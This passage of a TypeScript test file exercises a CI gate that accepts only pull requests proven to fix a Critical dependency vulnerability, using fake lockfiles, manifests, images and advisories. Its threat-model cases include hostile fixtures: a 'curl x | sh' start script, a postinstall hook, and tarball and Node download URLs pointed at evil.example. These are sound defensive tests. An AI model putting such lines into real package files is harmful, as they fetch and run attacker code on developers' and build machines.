import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { lockedPnpm } from '../apps/runner/scripts/install-pnpm.ts';
import { PinsHeld, PinsRefused } from '../apps/runner/src/pins.ts';
import { ENQUEUES } from '../policy/line.ts';
import {
  APP_GATES,
  asDerived,
  atOrAbove,
  type CriticalFixIO,
  criticalFix,
  type Finding,
  gatesPass,
  MOST_MOVES,
  movesOf,
  NOT_DERIVED,
  type Scan,
  scansShow,
} from './critical-fix.ts';
import { cleanGit, pinnedPnpm, scanOf } from './critical-fix-readers.ts';
import type { Run } from './pin-move-ran.ts';
import { ROOT } from './pin-move-shared.ts';

/**
 * A Critical fix (ADR 0020) is proved from the pull request's two commits by the gate's own scans. Each case is a
 * change against the app's pins as they are at the base, read by a fake scanner whose advisories the case names: the
 * passing ones, and each way the threat model says a change could try to pass without being one, held for Martin.
 */

const HEAD = 'a'.repeat(40);

/** A lockfile's `name@version` key, split as Trivy reads it: the name may start with `@`. */
function splitKey(key: string): { name: string; version: string } | undefined {
  const at = key.lastIndexOf('@');
  return at > 0 ? { name: key.slice(0, at), version: key.slice(at + 1) } : undefined;
}
const D = (c: string) => `sha256:${c.repeat(64)}`;
const BUILD = `node:24.22.1-alpine3.24@${D('1')}`;
const RUNTIME = `gcr.io/distroless/nodejs24-debian13:nonroot@${D('2')}`;

const LOCK = `lockfileVersion: '9.0'

settings:
  autoInstallPeers: true

importers:

  .:
    dependencies:
      pino:
        specifier: ^10.4.0
        version: 10.4.0
      protobufjs:
        specifier: ^7.6.4
        version: 7.6.4

packages:

  long@5.3.2:
    resolution: {integrity: sha512-long}

  pino@10.4.0:
    resolution: {integrity: sha512-pino}

  protobufjs@7.6.4:
    resolution: {integrity: sha512-p764}

snapshots:

  long@5.3.2: {}

  pino@10.4.0: {}

  protobufjs@7.6.4:
    dependencies:
      long: 5.3.2
`;

/** The fix: protobufjs to 7.6.6, which requires a package it did not before, and long as it was. */
const FIXED_LOCK = LOCK.replace(
  'specifier: ^7.6.4\n        version: 7.6.4',
  'specifier: ^7.6.6\n        version: 7.6.6',
)
  .replace(
    '  protobufjs@7.6.4:\n    resolution: {integrity: sha512-p764}',
    "  '@protobufjs/base64@1.1.2':\n    resolution: {integrity: sha512-b64}\n\n  protobufjs@7.6.6:\n    resolution: {integrity: sha512-p766}",
  )
  .replace(
    '  protobufjs@7.6.4:\n    dependencies:\n      long: 5.3.2',
    "  '@protobufjs/base64@1.1.2': {}\n\n  protobufjs@7.6.6:\n    dependencies:\n      '@protobufjs/base64': 1.1.2\n      long: 5.3.2",
  );

const MANIFEST = `{
  "name": "shop",
  "packageManager": "pnpm@12.16.1",
  "engines": {
    "node": ">=24.21.0"
  },
  "scripts": {
    "start": "node src/server.ts"
  },
  "dependencies": {
    "pino": "^10.4.0",
    "protobufjs": "^7.6.4"
  }
}
`;
const FIXED_MANIFEST = MANIFEST.replace('"protobufjs": "^7.6.4"', '"protobufjs": "^7.6.6"');

const DOCKERFILE = `# The shop's image.
FROM ${BUILD} AS build
RUN corepack enable
FROM ${RUNTIME}
CMD ["src/server.ts"]
`;
const MISE = `[settings]
lockfile = true

[tools]
# Exact: the Node both of the Dockerfile's stages run.
node = "24.22.1"
pnpm = "12"
`;
const MISE_LOCK = `[[tools.node]]
version = "24.22.1"
backend = "core:node"
specifiers = ["24.22.1"]

[tools.node."platforms.linux-x64"]
checksum = "sha256:${'c'.repeat(64)}"
url = "https://nodejs.org/dist/v24.22.1/node-v24.22.1-linux-x64.tar.gz"

[tools.node."platforms.macos-arm64"]
checksum = "sha256:${'d'.repeat(64)}"
url = "https://nodejs.org/dist/v24.22.1/node-v24.22.1-darwin-arm64.tar.gz"

[[tools.pnpm]]
version = "12.16.1"
`;
const BASE: Record<string, string> = {
  'pnpm-lock.yaml': LOCK,
  'package.json': MANIFEST,
  Dockerfile: DOCKERFILE,
  'mise.toml': MISE,
  'mise.lock': MISE_LOCK,
};

/** Node 24.22.1 to 24.22.2, in mise, its lock and both images. */
const NODE_MOVE = {
  'mise.toml': MISE.replace('node = "24.22.1"', 'node = "24.22.2"'),
  'mise.lock': MISE_LOCK.replaceAll('24.22.1', '24.22.2')
    .replace('c'.repeat(64), 'e'.repeat(64))
    .replace('d'.repeat(64), 'f'.repeat(64)),
  Dockerfile: DOCKERFILE.replace(BUILD, `node:24.22.2-alpine3.24@${D('3')}`).replace(
    RUNTIME,
    RUNTIME.replace(D('2'), D('4')),
  ),
};

/** The scanner's advisories, by `name@version`: each version below a fix has the finding. */
const ADVISORIES: Record<string, Finding[]> = {
  'protobufjs@7.6.4': [{ id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed: '7.6.5', severity: 'CRITICAL' }],
  'pino@10.4.0': [{ id: 'CVE-2026-9', pkg: 'pino', version: '10.4.0', fixed: '10.4.1', severity: 'MEDIUM' }],
};

/** A fake Trivy: the lockfile's packages, as it lists them, and each one's advisories. */
function scanLockfile(text: string, advisories: Record<string, Finding[]>): Scan {
  const packages = Object.keys((parse(text) as { packages?: Record<string, unknown> }).packages ?? {}).flatMap(
    (key) => {
      const split = splitKey(key);
      return split ? [split] : [];
    },
  );
  return {
    packages,
    findings: packages.flatMap(({ name, version }) => advisories[`${name}@${version}`] ?? []),
  };
}

/** Every one of the app's gates, run at the head by GitHub Actions in its own workflow for the pull request. */
const passedGates = (over: Partial<Run> = {}): Run[] =>
  Object.entries(APP_GATES).map(([name, workflow], i) => ({
    id: 100 + i,
    name,
    head_sha: HEAD,
    status: 'completed',
    conclusion: 'success',
    app: { slug: 'github-actions' },
    check_suite: { id: 10 + i },
    workflow,
    ...over,
  }));

const image = (packages: Scan['packages'], findings: Finding[] = [], node?: string): Scan => ({
  packages,
  findings,
  ...(node ? { node } : {}),
});
const OS = [{ name: 'libc6', version: '2.41-12' }];

/**
 * What the pin step's derivation writes on the base, by the move's `name@from>to`: for protobufjs to 7.6.5, its fix,
 * pnpm takes 7.6.6, the newest release its range admits, and writes the range with it.
 */
const DERIVED: Record<string, Record<string, string>> = {
  'protobufjs@7.6.4>7.6.5': { 'pnpm-lock.yaml': FIXED_LOCK, 'package.json': FIXED_MANIFEST },
};
/** The app's ruleset's required checks: its gates, and the review. */
const REQUIRED = [...Object.keys(APP_GATES), 'review'];

interface Fakes {
  advisories?: Record<string, Finding[]>;
  derived?: Record<string, Record<string, string> | Error>;
  /** Each move the gate asked the derivation for. */
  moves?: string[];
  /** How many times the proof read the head's lockfile and manifest, by the one reader that gives them. */
  reads?: { head: number };
  required?: string[];
  images?: Record<string, Scan>;
  node?: Record<string, Finding[]>;
  tags?: Record<string, string[]>;
  digests?: Record<string, string>;
  runs?: Run[];
  modes?: Record<string, string>;
  status?: Record<string, string>;
}

/** The files whose head the proof may read only through `head`, to compare with its own. */
const COMPARED = new Set(['pnpm-lock.yaml', 'package.json']);

/**
 * The change, file by file, against BASE, and the fakes it is read with. The diff gives the head's lockfile and
 * manifest as a getter that throws, so every case here fails if the proof reads them but through `head`.
 */
function io(change: Record<string, string>, fakes: Fakes = {}): CriticalFixIO {
  const files = Object.entries(change).map(([path, after]) => {
    const before = BASE[path] ?? '';
    if (!COMPARED.has(path)) return { path, before, after };
    return Object.defineProperty({ path, before }, 'after', {
      get() {
        throw new Error(`the proof read the head's ${path} outside the comparison`);
      },
    });
  });
  const raw = files
    .map(
      ({ path }) =>
        `:${fakes.modes?.[path] ?? '100644 100644'} 1111111 2222222 ${fakes.status?.[path] ?? 'M'}\t${path}`,
    )
    .join('\n');
  return {
    diff: async () => ({ raw, files }),
    head: async () => {
      if (fakes.reads) fakes.reads.head++;
      return Object.fromEntries(Object.entries(change).filter(([path]) => COMPARED.has(path)));
    },
    lockfile: async (text) => scanLockfile(text, fakes.advisories ?? ADVISORIES),
    image: async (reference) => {
      const scan = fakes.images?.[reference];
      if (!scan) throw new Error(`no such image: ${reference}`);
      return scan;
    },
    node: async (version) => fakes.node?.[version] ?? [],
    derive: async (move) => {
      const key = `${move.name}@${move.from}>${move.to}`;
      fakes.moves?.push(key);
      const derived = (fakes.derived ?? DERIVED)[key];
      if (derived instanceof Error) throw derived;
      if (!derived) throw new PinsRefused(`the fake writes no ${key}`);
      return derived;
    },
    tags: async (repository) => fakes.tags?.[repository] ?? [],
    digest: async (reference) => {
      const digest = fakes.digests?.[reference];
      if (!digest) throw new Error(`no such tag: ${reference}`);
      return digest;
    },
    runs: async () => fakes.runs ?? passedGates(),
    required: async () => fakes.required ?? REQUIRED,
  };
}

const PACKAGE_FIX = { 'pnpm-lock.yaml': FIXED_LOCK, 'package.json': FIXED_MANIFEST };

/** A Node move, with the images it moves to and Node's own advisories. */
const nodeFakes = (over: Fakes = {}): Fakes => ({
  images: {
    [BUILD]: image(OS, [], '24.22.1'),
    [`node:24.22.2-alpine3.24@${D('3')}`]: image(OS, [], '24.22.2'),
    [RUNTIME]: image(OS),
    [RUNTIME.replace(D('2'), D('4'))]: image(OS),
  },
  node: {
    '24.22.1': [{ id: 'CVE-2026-50', pkg: 'node', version: '24.22.1', fixed: '^24.22.2', severity: 'CRITICAL' }],
  },
  tags: { node: ['24.22.1-alpine3.24', '24.22.2-alpine3.24', '25.0.0-alpine3.24'] },
  digests: {
    'node:24.22.2-alpine3.24': D('3'),
    'gcr.io/distroless/nodejs24-debian13:nonroot': D('4'),
  },
  ...over,
});

const held = async (change: Record<string, string>, fakes: Fakes = {}) => {
  const said = await criticalFix(io(change, fakes), HEAD);
  if (!('reason' in said)) throw new Error(`passed: ${said.title}`);
  return said.reason;
};

describe('a Critical fix: what passes', () => {
  it('passes a package moved to fix a Critical, with the package its new version requires', async () => {
    const said = await criticalFix(io(PACKAGE_FIX), HEAD);
    expect(said).toMatchObject({ fixed: { pkg: 'protobufjs', ids: ['CVE-2026-1'], where: ['pnpm-lock.yaml'] } });
    expect('title' in said && said.title).toBe(
      "A Critical vulnerability's fix: protobufjs's CVE-2026-1 gone from pnpm-lock.yaml, at or above its fix, nothing new at High, every gate passed",
    );
    // The move is the gate's own: the package the base's scan rates Critical, and the fix the scan gives it.
    const moves: string[] = [];
    await criticalFix(io(PACKAGE_FIX, { moves }), HEAD);
    expect(moves).toEqual(['protobufjs@7.6.4>7.6.5']);
    // The lockfile alone, with no range moved in package.json, passes too, when it is what the move writes.
    const alone = FIXED_LOCK.replace('^7.6.6', '^7.6.4');
    expect(
      await criticalFix(
        io({ 'pnpm-lock.yaml': alone }, { derived: { 'protobufjs@7.6.4>7.6.5': { 'pnpm-lock.yaml': alone } } }),
        HEAD,
      ),
    ).toHaveProperty('title');
  });

  it("passes Node moved in mise, its lock and every FROM, to fix a Critical Node's own database names", async () => {
    const said = await criticalFix(io(NODE_MOVE, nodeFakes()), HEAD);
    expect(said).toMatchObject({ fixed: { pkg: 'node', ids: ['CVE-2026-50'], where: ['Node'] } });
  });

  it('is queued by the line at Guarded and Lights-out, never at Supervised', () => {
    expect(ENQUEUES.supervised).not.toContain('critical-fix');
    expect(ENQUEUES.guarded).toContain('critical-fix');
    expect(ENQUEUES['lights-out']).toContain('critical-fix');
  });
});

describe("a Critical fix: the plan's five, each held for Martin", () => {
  it('holds a change that claims a fix its scans do not show', async () => {
    const still = {
      ...ADVISORIES,
      'protobufjs@7.6.6': [{ ...((ADVISORIES['protobufjs@7.6.4'] as Finding[])[0] as Finding), version: '7.6.6' }],
    };
    expect(await held(PACKAGE_FIX, { advisories: still })).toMatch(/^the scans show no Critical fixed/);
    // Nor one whose finding goes while its package is not at or above the advisory's fixed version.
    const early = {
      ...ADVISORIES,
      'protobufjs@7.6.4': [{ ...((ADVISORIES['protobufjs@7.6.4'] as Finding[])[0] as Finding), fixed: '7.6.9' }],
    };
    expect(await held(PACKAGE_FIX, { advisories: early })).toBe(
      `pins only: ${NOT_DERIVED} (the pin step would not write protobufjs 7.6.9: the fake writes no protobufjs@7.6.4>7.6.9)`,
    );
  });

  it('holds a fix that also changes code, or anything that is not a pin', async () => {
    for (const path of [
      'src/server.ts',
      'scripts/seed.ts',
      '.github/workflows/check.yml',
      'pnpm-workspace.yaml',
      '.npmrc',
      'packages/x/package.json',
    ])
      expect(await held({ ...PACKAGE_FIX, [path]: 'x' })).toMatch(/^pins only: it changes .*not one of the app's pins/);
  });

  it('holds a finding gone because its package was removed, renamed or aliased, or the runtime image swapped', async () => {
    const removed = LOCK.replace(/\n {6}protobufjs:\n {8}specifier: \^7\.6\.4\n {8}version: 7\.6\.4/, '')
      .replace('  protobufjs@7.6.4:\n    resolution: {integrity: sha512-p764}\n\n', '')
      .replace('  protobufjs@7.6.4:\n    dependencies:\n      long: 5.3.2\n', '');
    expect(await held({ 'pnpm-lock.yaml': removed })).toBe(
      `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, the move changes package.json, and the head does not)`,
    );
    const renamed = LOCK.replaceAll('protobufjs', 'protobufjs-fixed');
    expect(await held({ 'pnpm-lock.yaml': renamed })).toMatch(/^pins only:/);
    const aliased = FIXED_LOCK.replace('version: 7.6.6', 'version: protobufjs-fork@7.6.6');
    expect(await held({ ...PACKAGE_FIX, 'pnpm-lock.yaml': aliased })).toMatch(
      /^pins only: the lockfile is not the one this move writes \(for protobufjs 7\.6\.4 to 7\.6\.5, pnpm-lock\.yaml differs from the gate's own at line \d+\)$/,
    );
    const swapped = DOCKERFILE.replace(RUNTIME, `gcr.io/distroless/static-debian13:nonroot@${D('5')}`);
    expect(await held({ Dockerfile: swapped })).toMatch(
      /swaps gcr\.io\/distroless\/nodejs24-debian13 for another image/,
    );
    // And a scan that no longer lists a package the base's did, however the lockfile reads.
    const quiet = { ...PACKAGE_FIX };
    const fakes = io(quiet);
    const scan = fakes.lockfile;
    fakes.lockfile = async (text) => {
      const read = await scan(text);
      return text === FIXED_LOCK ? { ...read, packages: read.packages.filter((p) => p.name !== 'long') } : read;
    };
    expect(await criticalFix(fakes, HEAD)).toMatchObject({
      reason: expect.stringMatching(/long is in the base's scan/),
    });
  });

  it('holds a Critical fix bundled with an unrelated bump', async () => {
    const bundled = FIXED_LOCK.replace(
      'specifier: ^10.4.0\n        version: 10.4.0',
      'specifier: ^10.4.1\n        version: 10.4.1',
    )
      .replace(
        '  pino@10.4.0:\n    resolution: {integrity: sha512-pino}',
        '  pino@10.4.1:\n    resolution: {integrity: sha512-pin1}',
      )
      .replace('  pino@10.4.0: {}', '  pino@10.4.1: {}');
    const manifest = FIXED_MANIFEST.replace('"pino": "^10.4.0"', '"pino": "^10.4.1"');
    expect(await held({ 'pnpm-lock.yaml': bundled, 'package.json': manifest })).toMatch(
      /^pins only: the lockfile is not the one this move writes \(for protobufjs 7\.6\.4 to 7\.6\.5, package\.json differs/,
    );
    // Within the lockfile alone too, and a package added that the new version does not require.
    const extra = FIXED_LOCK.replace(
      '  long@5.3.2:\n',
      '  left-pad@1.3.0:\n    resolution: {integrity: sha512-lp}\n\n  long@5.3.2:\n',
    );
    expect(await held({ ...PACKAGE_FIX, 'pnpm-lock.yaml': extra })).toMatch(/^pins only: the lockfile is not the one/);
    // And a group: two packages' Criticals fixed at once is no one move the gate writes.
    const both = {
      ...ADVISORIES,
      'pino@10.4.0': [{ id: 'CVE-2026-8', pkg: 'pino', version: '10.4.0', fixed: '10.4.1', severity: 'CRITICAL' }],
    };
    expect(await held({ 'pnpm-lock.yaml': bundled, 'package.json': manifest }, { advisories: both })).toMatch(
      /^pins only: the lockfile is not the one this move writes \(the pin step would not write pino 10\.4\.1: .*; for protobufjs 7\.6\.4 to 7\.6\.5, /,
    );
  });

  it('holds a fix rated Critical by its publisher and High by the scanner: the scanner’s rating alone releases one', async () => {
    const high = {
      'protobufjs@7.6.4': [{ id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed: '7.6.5', severity: 'HIGH' }],
    };
    expect(await held(PACKAGE_FIX, { advisories: high })).toBe(
      "the scans show no fix: the gate's scanner rates no package Critical, with a fix, in the base's pnpm-lock.yaml",
    );
    // The reader keeps Trivy's own rating, never the publisher's VendorSeverity.
    const read = scanOf([
      {
        Results: [
          {
            Class: 'lang-pkgs',
            Type: 'pnpm',
            Packages: [{ Name: 'protobufjs', Version: '7.6.4' }],
            Vulnerabilities: [
              {
                VulnerabilityID: 'CVE-2026-1',
                PkgName: 'protobufjs',
                InstalledVersion: '7.6.4',
                FixedVersion: '7.6.5',
                Severity: 'HIGH',
                VendorSeverity: { ghsa: 4 },
                DataSource: { ID: 'ghsa' },
              },
            ],
          },
        ],
      },
    ]);
    expect(read.findings).toEqual([
      { id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed: '7.6.5', severity: 'HIGH', format: 'npm' },
    ]);
  });
});

describe('a Critical fix: the threat model, each held', () => {
  it('the coder, turned: a script, the package manager, engines, or a range of another kind in package.json', async () => {
    for (const manifest of [
      FIXED_MANIFEST.replace('"node src/server.ts"', '"node src/server.ts && curl x | sh"'),
      FIXED_MANIFEST.replace('pnpm@12.16.1', 'pnpm@12.16.2'),
      FIXED_MANIFEST.replace('>=24.21.0', '>=24.22.0'),
      FIXED_MANIFEST.replace('"^7.6.6"', '"github:attacker/protobufjs"'),
      FIXED_MANIFEST.replace('"^7.6.6"', '"npm:protobufjs-fork@7.6.6"'),
      FIXED_MANIFEST.replace('"^7.6.6"', '"file:../x"'),
    ])
      expect(await held({ ...PACKAGE_FIX, 'package.json': manifest })).toMatch(
        /^pins only: (package\.json|the lockfile)/,
      );
    const sneaky = FIXED_MANIFEST.replace('"name": "shop"', '"name": "shop", "scripts": {"postinstall": "sh x"}');
    expect(await held({ ...PACKAGE_FIX, 'package.json': sneaky })).toBe(
      `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, package.json differs from the gate's own at line 2)`,
    );
  });

  it('a publisher: a new finding at High or above, or a fix that brings packages its version does not require', async () => {
    const brings = {
      ...ADVISORIES,
      'long@5.3.2': [],
      '@protobufjs/base64@1.1.2': [{ id: 'CVE-2026-7', pkg: '@protobufjs/base64', version: '1.1.2', severity: 'HIGH' }],
    };
    expect(await held(PACKAGE_FIX, { advisories: brings })).toBe(
      "nothing new: it brings something new: @protobufjs/base64's CVE-2026-7, HIGH, in pnpm-lock.yaml",
    );
  });

  it('anyone shaping the lockfile by hand: a source, an entry, an edge, a setting, a document; none is the move’s', async () => {
    for (const lock of [
      FIXED_LOCK.replace('{integrity: sha512-p766}', '{integrity: sha512-p766, tarball: https://evil.example/p.tgz}'),
      FIXED_LOCK.replace('{integrity: sha512-p766}', '{type: git, repo: https://github.com/x/y, commit: abc}'),
      FIXED_LOCK.replace('sha512-long', 'sha512-other'),
      `${FIXED_LOCK}\n  protobufjs@7.6.6:\n    resolution: {integrity: sha512-dup}\n`,
      FIXED_LOCK.replace('autoInstallPeers: true', 'autoInstallPeers: false'),
      FIXED_LOCK.replace('settings:', 'overrides:\n  long: 5.3.3\n\nsettings:'),
      `---\nlockfileVersion: '9.0'\n---\n${FIXED_LOCK}`,
      FIXED_LOCK.replace('  pino@10.4.0: {}', '  pino@10.4.0:\n    dependencies:\n      long: 5.3.2'),
      FIXED_LOCK.replace("'@protobufjs/base64': 1.1.2", "'@protobufjs/base64': evil@1.0.0"),
      FIXED_LOCK.replace('      long: 5.3.2\n', '      long: 5.3.9\n'),
      FIXED_LOCK.replace("'@protobufjs/base64': 1.1.2\n", "'@protobufjs/base64': 1.1.2(long@9.9.9)\n"),
      `${FIXED_LOCK}\n  ghost@1.0.0: {}\n`,
      FIXED_LOCK.replace('  pino@10.4.0: {}\n', ''),
      FIXED_LOCK.replace('      long: 5.3.2\n', '      long: 5.3.2\n      <<: {dependencies: {evil: 1.0.0}}\n'),
      `${FIXED_LOCK} `,
    ])
      expect(await held({ ...PACKAGE_FIX, 'pnpm-lock.yaml': lock })).toMatch(
        /^pins only: the lockfile is not the one this move writes \(for protobufjs 7\.6\.4 to 7\.6\.5, pnpm-lock\.yaml differs from the gate's own/,
      );
    // A scan that cannot read the base's lockfile throws, and the job holds it saying what it could not read.
    const unread = io(PACKAGE_FIX);
    unread.lockfile = async () => {
      throw new Error('Trivy read no packages from it');
    };
    await expect(criticalFix(unread, HEAD)).rejects.toThrow('Trivy read no packages');
    // A package that goes back, with no Critical moved.
    const back = LOCK.replace('version: 10.4.0', 'version: 10.3.0')
      .replace('pino@10.4.0:\n    resolution', 'pino@10.3.0:\n    resolution')
      .replace('pino@10.4.0: {}', 'pino@10.3.0: {}');
    expect(await held({ 'pnpm-lock.yaml': back })).toBe(
      `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, the move changes package.json, and the head does not)`,
    );
  });

  it('the move: what the pin step would not write, and any version but the gate’s own target', async () => {
    const range = (to: string) => ({ ...PACKAGE_FIX, 'package.json': FIXED_MANIFEST.replace('"^7.6.6"', `"${to}"`) });
    expect(
      await held(PACKAGE_FIX, { derived: { 'protobufjs@7.6.4>7.6.5': new PinsHeld('pnpm-workspace.yaml', 'x') } }),
    ).toBe(`pins only: ${NOT_DERIVED} (the pin step would not write protobufjs 7.6.5: x)`);
    // Back, another major, a range the pin step never writes, a prerelease: each is not the gate's bytes.
    for (const to of ['^7.6.3', '^8.0.0', '>=7.6.6', '^7.6.7-rc.1', '~7.6.6'])
      expect(await held(range(to))).toBe(
        `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, package.json differs from the gate's own at line 12)`,
      );
    // A later fix in the advisory moves the gate's target with it; the head's own say moves nothing.
    const finding = ADVISORIES['protobufjs@7.6.4']?.[0] as Finding;
    expect(await held(PACKAGE_FIX, { advisories: { 'protobufjs@7.6.4': [{ ...finding, fixed: '7.6.9' }] } })).toBe(
      `pins only: ${NOT_DERIVED} (the pin step would not write protobufjs 7.6.9: the fake writes no protobufjs@7.6.4>7.6.9)`,
    );
    // A derivation that fails otherwise is no hold of the rule's: the job holds it saying what it could not read.
    await expect(
      criticalFix(io(PACKAGE_FIX, { derived: { 'protobufjs@7.6.4>7.6.5': new Error('pnpm exited 1') } }), HEAD),
    ).rejects.toThrow('pnpm exited 1');
  });

  it('the ruleset, not the head, says what must pass: a check the gate does not know, or no review', async () => {
    expect(await held(PACKAGE_FIX, { required: [...REQUIRED, 'gates / something new'] })).toBe(
      'every gate passes: the app requires gates / something new, which the gate does not know',
    );
    expect(await held(PACKAGE_FIX, { required: Object.keys(APP_GATES) })).toMatch(/does not require review/);
  });

  it('anyone making Node vanish: an image that named its Node at the base and does not at the head', async () => {
    const fakes = nodeFakes();
    (fakes.images as Record<string, Scan>)[`node:24.22.2-alpine3.24@${D('3')}`] = image(OS);
    expect(await held(NODE_MOVE, fakes)).toMatch(/names no Node at the head/);
  });

  it('anyone who can write a check: another app’s run, another workflow’s, another head’s, or one not a success', async () => {
    const name = 'gates / lockfile scan';
    const without = passedGates().filter((r) => r.name !== name);
    const one = passedGates().find((r) => r.name === name) as Run;
    for (const [run, why] of [
      [{ ...one, app: { slug: 'mrogan-software-factory' } }, 'has not run'],
      [{ ...one, workflow: '.github/workflows/other.yml' }, 'ran in no run of .github/workflows/gates.yml'],
      [{ ...one, workflow: null }, 'ran in no run of'],
      [{ ...one, head_sha: 'b'.repeat(40) }, 'has not run'],
      [{ ...one, conclusion: 'skipped' }, 'is skipped, not a success'],
      [{ ...one, conclusion: 'failure' }, 'is failure, not a success'],
      [{ ...one, status: 'in_progress', conclusion: null }, 'has not finished'],
    ] as const) {
      expect(await held(PACKAGE_FIX, { runs: [...without, run as Run] })).toContain(`every gate passes: ${name}`);
      expect(gatesPass([...without, run as Run], HEAD, REQUIRED)).toContain(why);
    }
    // A newer attempt that succeeded counts; a second run that succeeded never hides one that failed.
    expect(
      gatesPass([...without, { ...one, conclusion: 'failure' }, { ...one, id: 999 }], HEAD, REQUIRED),
    ).toBeUndefined();
    expect(
      gatesPass(
        [...without, { ...one, conclusion: 'failure' }, { ...one, id: 999, check_suite: { id: 77 } }],
        HEAD,
        REQUIRED,
      ),
    ).toContain('failure');
  });

  it('the same through an image: a digest not its tag’s, a move back or across a major, a FROM it cannot read', async () => {
    const notTags = nodeFakes({
      digests: { 'node:24.22.2-alpine3.24': D('9'), 'gcr.io/distroless/nodejs24-debian13:nonroot': D('4') },
    });
    expect(await held(NODE_MOVE, notTags)).toMatch(/^forward on its line: a digest that is not the tag's/);
    const back = { ...NODE_MOVE, Dockerfile: NODE_MOVE.Dockerfile.replace('24.22.2-alpine3.24', '24.22.0-alpine3.24') };
    expect(await held(back, nodeFakes())).toMatch(/^forward on its line: a move backwards/);
    const major = { ...NODE_MOVE, Dockerfile: NODE_MOVE.Dockerfile.replace('24.22.2-alpine3.24', '25.0.0-alpine3.24') };
    expect(await held(major, nodeFakes())).toMatch(/^forward on its line: a major/);
    for (const line of [
      `FROM --platform=linux/amd64 ${BUILD} AS build`,
      'FROM node:24.22.2-alpine3.24 AS build',
      `FROM ${BUILD} AS builder`,
    ])
      expect(await held({ Dockerfile: DOCKERFILE.replace(`FROM ${BUILD} AS build`, line) })).toMatch(
        /^pins only: Dockerfile/,
      );
  });

  it('Node: mise and its lock together, forward on its major, and every image on the Node mise pins', async () => {
    expect(await held({ 'mise.toml': NODE_MOVE['mise.toml'] })).toMatch(/do not move Node together/);
    expect(
      await held({ ...NODE_MOVE, 'mise.lock': NODE_MOVE['mise.lock'].replace('dist/v24.22.2/', 'dist/v24.22.3/') }),
    ).toMatch(/^pins only: mise\.lock/);
    // A lock whose version moves while a platform's download stays on the old Node.
    const stale = NODE_MOVE['mise.lock']
      .replace(
        'url = "https://nodejs.org/dist/v24.22.2/node-v24.22.2-darwin-arm64.tar.gz"',
        'url = "https://nodejs.org/dist/v24.22.1/node-v24.22.1-darwin-arm64.tar.gz"',
      )
      .replace('f'.repeat(64), 'd'.repeat(64));
    expect(await held({ ...NODE_MOVE, 'mise.lock': stale }, nodeFakes())).toMatch(
      /mise\.lock:\d+ is left on another Node than 24\.22\.2/,
    );
    expect(
      await held({ ...NODE_MOVE, 'mise.lock': NODE_MOVE['mise.lock'].replace('nodejs.org', 'evil.example') }),
    ).toMatch(/^pins only: mise\.lock/);
    expect(
      await held({ ...NODE_MOVE, 'mise.toml': NODE_MOVE['mise.toml'].replace('pnpm = "12"', 'pnpm = "13"') }),
    ).toMatch(/^pins only: mise\.toml/);
    const backward = {
      'mise.toml': MISE.replace('24.22.1', '24.22.0'),
      'mise.lock': MISE_LOCK.replaceAll('24.22.1', '24.22.0'),
    };
    expect(await held(backward)).toMatch(/not forward on its major/);
    // mise and its lock alone, the Dockerfile untouched: every image left on the old Node.
    const miseOnly = { 'mise.toml': NODE_MOVE['mise.toml'], 'mise.lock': NODE_MOVE['mise.lock'] };
    expect(await held(miseOnly, nodeFakes())).toBe(
      "only what the fix needs: mise's Node moves, and no FROM moves with it: every image runs Node",
    );
    // An image left behind, or one that runs another Node than mise pins.
    const oneFrom = { ...NODE_MOVE, Dockerfile: DOCKERFILE.replace(BUILD, `node:24.22.2-alpine3.24@${D('3')}`) };
    expect(await held(oneFrom, nodeFakes())).toMatch(/moves 1 of the Dockerfile's 2 FROM lines/);
    const other = nodeFakes();
    (other.images as Record<string, Scan>)[RUNTIME.replace(D('2'), D('4'))] = image(OS, [], '24.21.0');
    expect(await held(NODE_MOVE, other)).toMatch(/runs Node 24\.21\.0 at the head, and mise pins 24\.22\.2/);
  });

  it('a package fix that moves an image or Node too, and an image fix that moves a package', async () => {
    const fakes = nodeFakes({ node: {} });
    expect(await held({ ...PACKAGE_FIX, ...NODE_MOVE }, fakes)).toMatch(/moves an image or Node too/);
  });
});

describe('a Critical fix: the derived lockfile’s own trust, each held', () => {
  it('a move that names a package with no Critical: only what the base’s scan rates Critical is a move', async () => {
    const pino = LOCK.replace(
      'specifier: ^10.4.0\n        version: 10.4.0',
      'specifier: ^10.4.0\n        version: 10.4.1',
    )
      .replace(
        'pino@10.4.0:\n    resolution: {integrity: sha512-pino}',
        'pino@10.4.1:\n    resolution: {integrity: sha512-pin1}',
      )
      .replace('  pino@10.4.0: {}', '  pino@10.4.1: {}');
    const moves: string[] = [];
    expect(await held({ 'pnpm-lock.yaml': pino }, { moves })).toBe(
      `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, the move changes package.json, and the head does not)`,
    );
    expect(moves).toEqual(['protobufjs@7.6.4>7.6.5']);
    // With no Critical in the base, no move is written at all.
    const none: string[] = [];
    expect(await held({ 'pnpm-lock.yaml': pino }, { moves: none, advisories: {} })).toBe(
      "the scans show no fix: the gate's scanner rates no package Critical, with a fix, in the base's pnpm-lock.yaml",
    );
    expect(none).toEqual([]);
  });

  it('a version the head chose, in its range or its lockfile: never read, only compared', async () => {
    for (const range of ['^7.6.6+evil', 'latest', '^7.6.6 || ^8', 'npm:protobufjs@7.6.6'])
      expect(await held({ ...PACKAGE_FIX, 'package.json': MANIFEST.replace('"^7.6.4"', JSON.stringify(range)) })).toBe(
        `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, package.json differs from the gate's own at line 12)`,
      );
  });

  it('a package.json range moved more than the move needs: another operator, a later version, another package', async () => {
    const manifest = (from: string, to: string) => ({ ...PACKAGE_FIX, 'package.json': MANIFEST.replace(from, to) });
    const at = (line: number) =>
      `pins only: ${NOT_DERIVED} (for protobufjs 7.6.4 to 7.6.5, package.json differs from the gate's own at line ${line})`;
    expect(await held(manifest('"^7.6.4"', '"~7.6.6"'))).toBe(at(12));
    expect(await held(manifest('"^7.6.4"', '"^7.7.0"'))).toBe(at(12));
